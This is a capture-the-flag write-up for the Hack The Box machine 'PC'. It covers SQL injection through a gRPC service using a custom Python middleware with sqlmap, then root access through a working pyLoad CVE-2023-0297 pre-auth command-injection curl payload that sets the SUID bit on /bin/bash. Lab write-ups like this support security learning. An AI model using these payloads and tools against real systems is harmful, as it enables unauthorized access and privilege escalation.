---
layout: single
title: PC hackthebox writeup
excerpt: "Easy linux machine in which we hack gRPC via SQL injection and escalate privileges thanks to a pyload CVE"
date: 2023-05-26
classes: wide
header:
  teaser: /assets/images/pc/pc_icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - hackthebox
  - gRPC
  - SQL injection
  - CVE
  - pyload
---

![](/assets/images/pc/pc.png)

## User Flag

```shell
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
50051/tcp open  unknown syn-ack ttl 63
```

nmap doesn't know what service is running under port 50051. However, just by searching on google, we find it's a service called gRPC. gRPC is basically like an API but it uses http2. Two useful clients for gRPC are grpcurl and grpc-client-cli. In this case, I'm going to use grpcurl. First, let's inspect the gRPC options.

```shell
$ grpcurl -v -plaintext 10.10.11.214:50051 list

SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

```shell
$ grpcurl -v -plaintext 10.10.11.214:50051 describe

SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
grpc.reflection.v1alpha.ServerReflection is a service:
service ServerReflection {
  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
}
```

Now let's register an account and login with it. To know the data I had to send I used the grpc-client-cli like this

```shell
$ grpc-client-cli 10.10.11.214:50051
? Choose a service: SimpleApp
? Choose a method: RegisterUser
Message json (type ? to see defaults): ?
{"username":"","password":""}
```

Now let's call it using grpcurl

```shell
$ grpcurl -plaintext -d '{"username":"dasor", "password":"dasor"}' 10.10.11.214:50051 SimpleApp.RegisterUser
{
  "message": "Account created for user dasor!"
}
```

```shell
grpcurl -plaintext -d '{"username":"dasor", "password":"dasor"}' 10.10.11.214:50051 SimpleApp.LoginUser
{
  "message": "Your id is 241."
}
```

Let's check our id using the method.

```shell
$ grpcurl -plaintext -d '{"id":"241"}' 10.10.11.214:50051 SimpleApp.getInfo
{
  "message": "Authorization Error.Missing 'token' header"
}
```

It seems we need some token however, when we logged in we didn't get any. After some time thinking I decided to use the verbose option of grpcurl.

```shell
grpcurl -v -plaintext -d '{"username":"dasor", "password":"dasor"}' 10.10.11.214:50051 SimpleApp.LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Response contents:
{
  "message": "Your id is 865."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZGFzb3IiLCJleHAiOjE2ODUxNDE5NzB9.vJxPOZvh0awP1Ocw2U3fmI1u7KP9jK-Ct__kbP5ZwpY'
Sent 1 request and received 1 response
```

Now we have a token.

```shell
$ grpcurl -v -plaintext -d '{"id":"865"}' -rpc-header "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZGFzb3IiLCJleHAiOjE2ODUxNDE5NzB9.vJxPOZvh0awP1Ocw2U3fmI1u7KP9jK-Ct__kbP5ZwpY" 10.10.11.214:50051 SimpleApp.getInfo

Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZGFzb3IiLCJleHAiOjE2ODUxNDE5NzB9.vJxPOZvh0awP1Ocw2U3fmI1u7KP9jK-Ct__kbP5ZwpY

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Response contents:
{
  "message": "Will update soon."
}
```

Now we have two options, try and hack the JWT or try to hack the gRPC. This gRPC really reminded me of a websocket that we hacked with sqli with the middleware made by [Rayhan0x01](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) in the machine called [Soccer](../Soccer-Writeup). So I modified the middleware to use it for gRPC.

```shell
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
import os
import sys
import subprocess

server = "10.10.11.214:50051"

def send_ws(payload):
    # If the server returns a response on connect, use below line
    #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
    message = unquote(payload).replace('"','\'')
    data = '{"id":"%s"}' % message # campo del websocket
    token = sys.argv[1]
    command = 'grpcurl -v -plaintext -d ' + '\'' + data + '\'' + ' -rpc-header "token: ' + token + '" 10.10.11.214:50051 SimpleApp.getInfo | grep \'message\''

    print(data)
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    stdout = stdout.decode('utf-8')
    return stdout

def middleware_server(host_port,content_type="text/plain"):

    class CustomHandler(SimpleHTTPRequestHandler):
    	def do_GET(self) -> None:
    		self.send_response(200)
    		try:
    			payload = urlparse(self.path).query.split('=',1)[1]
    		except IndexError:
    			payload = False

    		if payload:
    			content = send_ws(payload)
    		else:
    			content = 'No parameters specified!'

    		self.send_header("Content-type", content_type)
    		self.end_headers()
    		self.wfile.write(bytes(content,"utf-8"))
    		return

    class _TCPServer(TCPServer):
    	allow_reuse_address = True

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
    middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
    pass
```

Once the middleware worked I ran sqlmap.

```shell
$ sqlmap http://localhost:8081/?id=227 -v --level 3 --risk 3 --batch --dump-all --flush-session
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.5#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org


...

[22:29:27] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable
[22:29:35] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite'
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) value? [Y/n] Y
[22:29:35] [INFO] testing 'Generic inline queries'
[22:29:35] [INFO] testing 'SQLite inline queries'
[22:29:35] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[22:29:36] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[22:29:36] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[22:29:36] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[22:30:02] [INFO] GET parameter 'id' appears to be 'SQLite > 2.0 OR time-based blind (heavy query)' injectable
[22:30:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:30:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:30:09] [INFO] target URL appears to be UNION injectable with 1 columns
[22:30:09] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
...
[22:30:09] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[22:30:09] [INFO] sqlmap will dump entries of all tables from all databases now
[22:30:09] [INFO] fetching tables for database: 'SQLite_masterdb'
[22:30:10] [INFO] fetching columns for table 'messages'
[22:30:10] [INFO] fetching entries for table 'messages'
Database: <current>
Table: messages
[1 entry]
+----+----------------------------------------------+----------+
| id | message                                      | username |
+----+----------------------------------------------+----------+
| 1  | The admin is working hard to fix the issues. | admin    |
+----+----------------------------------------------+----------+

[22:30:10] [INFO] table 'SQLite_masterdb.messages' dumped to CSV file '/home/dasor/.local/share/sqlmap/output/localhost/dump/SQLite_masterdb/messages.csv'
[22:30:10] [INFO] fetching columns for table 'accounts'
[22:30:11] [INFO] fetching entries for table 'accounts'
Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+
```

Now we can ssh with user sau.

```shell
$ ssh sau@10.10.11.214
sau@10.10.11.214's password:
Last login: Fri May 26 20:29:57 2023 from 10.10.14.50
sau@pc:~$
```

## Root Flag

After searching for common privesc vectors I decided to do port forwarding on port 9666 since I saw it on netstat.

```shell
sau@pc:~$ netstat -tupan | grep -i listen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::50051                :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

There is no need to use chisel since we have ssh access, we can just do an ssh tunnel.

```shell
$ ssh -N -L 9666:127.0.0.1:9666 sau@10.10.11.214
sau@10.10.11.214's password:
```

Port 9666 is pyLoad I tried to login with user sau but it didn't work. I decided to look at the version of pyLoad and search for CVE's

```shell
sau@pc:~$ pyload --version
pyLoad 0.5.0
```

By searching in Snyk I found a [github with a poc](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad). The exploit code works perfectly just by executing it we can get root.

```shell
$ curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"chmod%20u%2Bs%20/bin/bash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://localhost:9666/flash/addcrypted2'
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Max-Age: 1800
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: OPTIONS, GET, POST
Vary: Accept-Encoding
Date: Fri, 26 May 2023 20:49:01 GMT
Server: Cheroot/8.6.0

Could not decrypt key%
```

```shell
sau@pc:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
sau@pc:~$ bash -p
bash-5.0# whoami
root
```

That's all, thank you for reading!
